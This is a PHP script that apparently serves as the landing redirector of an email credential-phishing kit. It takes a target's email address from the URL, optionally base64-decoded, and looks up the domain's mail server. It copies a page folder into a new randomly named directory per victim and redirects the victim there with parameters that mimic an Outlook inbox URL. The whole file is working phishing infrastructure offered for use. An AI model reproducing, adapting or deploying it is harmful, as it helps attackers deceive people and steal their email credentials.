<?php

if(isset($_GET['uid'])){
$text=$_GET['uid'];
if (strpos($text,'@') !== false) {
$textuid=$_GET['uid'];
}else{
$textuid=base64_decode($_GET['uid']);}

$em=$textuid;
@$ar=explode("@",$em);
$urltt=$ar[1];
$email=$textuid;

$random = rand(50000,100000000000);

$log = $textuid;
function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

function mxrecordValidate($email, $domain) {
$arr = dns_get_record($domain, DNS_MX);
if ($arr[0]['host'] == $domain && !empty($arr[0]['target'])){
return $arr[0]['target'];
}
}

$domain = substr(strrchr($email, "@"), 1);
$serv= mxrecordValidate($email, $domain);
$dst    = $serv.substr(md5($random), 0, 1000000000);

$var = $_GET['openurl'];


$src="p";
recurse_copy( $src,$dst );	

if(isset($_GET['mgs'])){
	$msg='mgs=1';
}
if(isset($_GET['AllowGuestInvitations1'])){ $roll1 ='AllowGuestInvitations1=On&'; } 
if(isset($_GET['AllowGuestInvitations2'])){ $roll2 ='AllowGuestInvitations2=On&'; } 
if(isset($_GET['AllowGuestInvitations3'])){ $roll3 ='AllowGuestInvitations3=On&'; } 
if(isset($_GET['AllowGuestInvitations4'])){ $roll4 ='AllowGuestInvitations4=On&'; } 
if(isset($_GET['AllowGuestInvitations5'])){ $roll5 ='AllowGuestInvitations5=On&'; }

header("location: {$dst}/?openurl={$var}&Key={$random}&main_domain={$var}&fid=1&sessionid={$log}&fid=1&fav.1&uid={$log}&{$msg}&{$roll1}{$roll2}{$roll3}{$roll4}{$roll5}rand=13InboxLight.aspx");
exit;
}else{
header("location: i.html");
}